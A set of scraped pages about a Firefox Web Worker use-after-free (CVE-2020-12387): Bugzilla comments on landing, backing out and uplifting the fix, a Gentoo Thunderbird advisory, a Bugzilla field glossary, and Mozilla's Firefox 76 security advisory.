[task 2020-03-27T05:39:54.919Z] 05:39:54 INFO - GECKO(3816) | #17: static nsThread::ThreadFunc(void\*) [xpcom/threads/nsThread.cpp:466]

[task 2020-03-27T05:39:54.919Z] 05:39:54 INFO -

[task 2020-03-27T05:39:55.528Z] 05:39:55 INFO - GECKO(3816) | #18: \_PR\_NativeRunThread(void\*) [nsprpub/pr/src/threads/combined/pruthr.c:399]

[task 2020-03-27T05:39:55.528Z] 05:39:55 INFO -

[task 2020-03-27T05:39:55.531Z] 05:39:55 INFO - GECKO(3816) | #19: pr\_root(void\*) [nsprpub/pr/src/md/windows/w95thred.c:139]

[task 2020-03-27T05:39:55.531Z] 05:39:55 INFO -

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO - GECKO(3816) | #20: ucrtbase.DLL + 0x3e16f

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO -

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO - GECKO(3816) | #21: kernel32.dll + 0x4ef3c

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO -

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO - GECKO(3816) | #22: ntdll.dll + 0x63618

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO -

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO - GECKO(3816) | #23: ntdll.dll + 0x635eb

Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=1545345#c47)• 5 years ago |
|  | |

My local test matrix was primarily using ASAN for most directories, missing the fact that normal `MOZ_ASSERT`s will not fire in that case although many other DEBUG-only things are run under ASAN. I've corrected the sanity-checking assertion locally and am locally re-running impacted tests under a full DEBUG build and will re-submit shortly.

Flags: needinfo?(bugmail)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=1545345#c48)• 5 years ago |
|  | |

Landed: <https://hg.mozilla.org/integration/autoland/rev/1911a0d1e751345189e314a40e439207ecefe6fc>

Backed out for causing CallbackObject.cpp Hazard failures:

<https://hg.mozilla.org/integration/autoland/rev/b261e44b83ad010cbc4c6973dea831260963e1e7>

Push with failure: <https://treeherder.mozilla.org/#/jobs?repo=autoland&group_state=expanded&selectedJob=295119136&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&revision=f41ad60fa0d98fa793bdbb7a74c755467ab45d6e>

Failure log: <https://treeherder.mozilla.org/logviewer.html#?job_id=295105741&repo=autoland>

TEST-UNEXPECTED-FAIL | hazards | unrooted 'realCallback' of type 'JSObject\*' live across GC call at dom/bindings/CallbackObject.cpp:245

Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=1545345#c49)• 5 years ago |
|  | |

I've consulted with :sfink on the hazard analysis which did not like the QueryInterface calls performed in <https://searchfox.org/mozilla-central/rev/8526066f548af9ec3ebb462ff73c47ccc183f533/js/xpconnect/wrappers/WrapperFactory.cpp#843>. This call previously didn't matter because the unrooted `realCallback` was not used beyond the call. But with the forbidden script check refactoring, it is.

Given the analytical issues involved, we've opted to go with rooting `realCallback`. Since the patch has already been rendered public already by the 2 bounced landings, I've pushed a hazard analysis job to try and will re-land assuming that comes back green:

<https://treeherder.mozilla.org/#/jobs?repo=try&revision=e71b9e9ea2372febb5593034e1c0c0e30cb117d6>

Flags: needinfo?(bugmail)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 50](/show_bug.cgi?id=1545345#c50)• 5 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/cb814ebff5a56845db97bbed1ef52b0c523661f1>

<https://hg.mozilla.org/mozilla-central/rev/cb814ebff5a5>

Group: dom-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 5 years ago
[status-firefox76](/buglist.cgi?f1=cf_status_firefox76&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla76

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 51](/show_bug.cgi?id=1545345#c51)• 5 years ago |
|  | |

(not urgent) Looks like this'll eventually need a rebased patch for ESR68.

[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F) → [76+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=76%2B)Flags: needinfo?(bugmail)

|  | [Brindusa Tot, Desktop QA](/user_profile?user_id=553429) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a30106619_553429)• 5 years ago |

Flags: qe-verify+Whiteboard: [post-critsmash-triage]

|  | [Daniel Bodea [:danibodea]](/user_profile?user_id=616104) |  |
| --- | --- | --- |
| [Comment 52](/show_bug.cgi?id=1545345#c52)• 5 years ago |
|  | |

I am attempting to verify this fix, but I am having trouble creating the server correctly. Can you provide more detailed steps (or a tutorial that I could understand) on the server creation part? My skills stop at the creation of the Simple HTTP server. Thank you.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 53](/show_bug.cgi?id=1545345#c53)• 5 years ago |
|  | |

A number of other accidentally mitigating fixes have meant that the reproducing test cases haven't worked for a very long time. We're still pursuing fuzzer improvements to help provide confirmation of the fixes, but for now the fix can't be verified.

Flags: qe-verify+ → qe-verify-

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 54](/show_bug.cgi?id=1545345#c54)• 5 years ago |
|  | |

Attached file
[Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug](attachment.cgi?id=9141601)
— [Details](attachment.cgi?id=9141601&action=edit)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 55](/show_bug.cgi?id=1545345#c55)• 5 years ago |
|  | |

Comment on [attachment 9141601](/attachment.cgi?id=9141601 "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug") [[details]](/attachment.cgi?id=9141601&action=edit "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug")

[Bug 1545345](/show_bug.cgi?id=1545345 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") - Improve worker shutdown on ESR68. r=baku,smaug

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**:
* **User impact if declined**:
* **Fix Landed on Version**:
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: It seems to have not exploded anything on the branches it already landed on.
* **String or UUID changes made by this patch**:
Flags: needinfo?(bugmail)
[Attachment #9141601](/attachment.cgi?id=9141601&action=edit "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug") -
Flags: approval-mozilla-esr68?

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 56](/show_bug.cgi?id=1545345#c56)• 5 years ago |
|  | |

Patch is now updated for ESR68 in that separate phabricator request. I did some local testing with a debug build and explicitly including the test that caused the initial landing bounce. I did not push to try. I requested the uplift approval in case that's desired.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 57](/show_bug.cgi?id=1545345#c57)• 5 years ago |
|  | |

Comment on [attachment 9141601](/attachment.cgi?id=9141601 "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug") [[details]](/attachment.cgi?id=9141601&action=edit "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug")

[Bug 1545345](/show_bug.cgi?id=1545345 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") - Improve worker shutdown on ESR68. r=baku,smaug

Approved for 68.8esr.

[Attachment #9141601](/attachment.cgi?id=9141601&action=edit "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug") -
Flags: approval-mozilla-esr68? → approval-mozilla-esr68+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 58](/show_bug.cgi?id=1545345#c58)• 5 years ago |
|  | |

<https://hg.mozilla.org/releases/mozilla-esr68/rev/45d7ff077528>

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a32601860_428608)• 5 years ago |

Whiteboard: [post-critsmash-triage] → [post-critsmash-triage][adv-main76+]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a32602872_428608)• 5 years ago |

Whiteboard: [post-critsmash-triage][adv-main76+] → [post-critsmash-triage][adv-main76+][adv-ESR68.8+]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 59](/show_bug.cgi?id=1545345#c59)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9144306)
— [Details](attachment.cgi?id=9144306&action=edit)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a32675510_428608)• 5 years ago |

Alias: CVE-2020-12387

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a38072233_75935)• 5 years ago |

Regressions: [1649448](/show_bug.cgi?id=1649448 "RESOLVED FIXED - Assertion failure: aGlobal, at /builds/worker/checkouts/gecko/dom/file/Blob.cpp:74")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a41340152_1689)• 4 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a161525644_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1545345&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Looben Yang](/user_profile?user_id=506912)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from security.gentoo.org_921c59c5_20250119_122716.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Mozilla Thunderbird: Multiple vulnerabilities — GLSA **202005-03**

Multiple vulnerabilities have been found in Mozilla Thunderbird,
the worst of which could result in the arbitrary execution of code.

### Affected packages

| Package | **mail-client/thunderbird** on all architectures |
| --- | --- |
| Affected versions | < **68.8.0** |
| Unaffected versions | >= **68.8.0** |

| Package | **mail-client/thunderbird-bin** on all architectures |
| --- | --- |
| Affected versions | < **68.8.0** |
| Unaffected versions | >= **68.8.0** |

### Background

Mozilla Thunderbird is a popular open-source email client from the
Mozilla project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Thunderbird.
Please review the CVE identifiers referenced below for details.

### Impact

A remote attacker may be able to execute arbitrary code, cause a Denial
of Service condition or spoof sender email address.

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Thunderbird users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=mail-client/thunderbird-68.8.0"

```

All Mozilla Thunderbird binary users should upgrade to the latest
version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose
 ">=mail-client/thunderbird-bin-68.8.0"

```
### References

* [CVE-2020-12387](https://nvd.nist.gov/vuln/detail/CVE-2020-12387)
* [CVE-2020-12392](https://nvd.nist.gov/vuln/detail/CVE-2020-12392)
* [CVE-2020-12395](https://nvd.nist.gov/vuln/detail/CVE-2020-12395)
* [CVE-2020-12397](https://nvd.nist.gov/vuln/detail/CVE-2020-12397)
* [CVE-2020-6831](https://nvd.nist.gov/vuln/detail/CVE-2020-6831)
* [MFSA-2020-18](https://www.mozilla.org/en-US/security/advisories/mfsa2020-18/)

**Release date**

May 12, 2020

**Latest revision**

May 12, 2020: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [721324](https://bugs.gentoo.org/show_bug.cgi?id=721324)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from wiki.mozilla.org_3659d679_20250119_140530.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from www.mozilla.org_99346820_20250119_122717.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-16

## Security Vulnerabilities fixed in Firefox 76

Announced
May 5, 2020
Impact
critical
Products
Firefox
Fixed in

* Firefox 76

#### [#CVE-2020-12387: Use-after-free during worker shutdown](#CVE-2020-12387)

Reporter
Looben Yang
Impact
critical
##### Description

A race condition when running shutdown code for Web Worker led to a use-after-free vulnerability. This resulted in a potentially exploitable crash.

##### References

* [Bug 1545345](https://bugzilla.mozilla.org/show_bug.cgi?id=1545345)

#### [#CVE-2020-12388: Sandbox escape with improperly guarded Access Tokens](#CVE-2020-12388)

Reporter
James Forshaw of Google Project Zero
Impact
critical
##### Description

The Firefox content processes did not sufficiently lockdown access control which could result in a sandbox escape.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1618911](https://bugzilla.mozilla.org/show_bug.cgi?id=1618911)

#### [#CVE-2020-12389: Sandbox escape with improperly separated process types](#CVE-2020-12389)

Reporter
Niklas Baumstark
Impact
high
##### Description

The Firefox content processes did not sufficiently lockdown access control which could result in a sandbox escape.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1554110](https://bugzilla.mozilla.org/show_bug.cgi?id=1554110)

#### [#CVE-2020-6831: Buffer overflow in SCTP chunk input validation](#CVE-2020-6831)

Reporter
Natalie Silvanovich of Google Project Zero
Impact
high
##### Description

A buffer overflow could occur when parsing and validating SCTP chunks in WebRTC. This could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1632241](https://bugzilla.mozilla.org/show_bug.cgi?id=1632241)

#### [#CVE-2020-12390: Incorrect serialization of nsIPrincipal.origin for IPv6 addresses](#CVE-2020-12390)

Reporter
Giorgio Maone
Impact
moderate
##### Description

Incorrect origin serialization of URLs with IPv6 addresses could lead to incorrect security checks

##### References

* [Bug 1141959](https://bugzilla.mozilla.org/show_bug.cgi?id=1141959)

#### [#CVE-2020-12391: Content-Security-Policy bypass using object elements](#CVE-2020-12391)

Reporter
Giorgio Maone
Impact
moderate
##### Description

Documents formed using `data:` URLs in an `object` element failed to inherit the CSP of the creating context. This allowed the execution of scripts that should have been blocked, albeit with a unique opaque origin.

##### References

* [Bug 1457100](https://bugzilla.mozilla.org/show_bug.cgi?id=1457100)

#### [#CVE-2020-12392: Arbitrary local file access with 'Copy as cURL'](#CVE-2020-12392)

Reporter
Ophir LOJKINE
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP POST data of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in the disclosure of local files.

##### References

* [Bug 1614468](https://bugzilla.mozilla.org/show_bug.cgi?id=1614468)

#### [#CVE-2020-12393: Devtools' 'Copy as cURL' feature did not fully escape website-controlled data, potentially leading to command injection](#CVE-2020-12393)

Reporter
David Yesland
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP method of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in command injection and arbitrary command execution.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

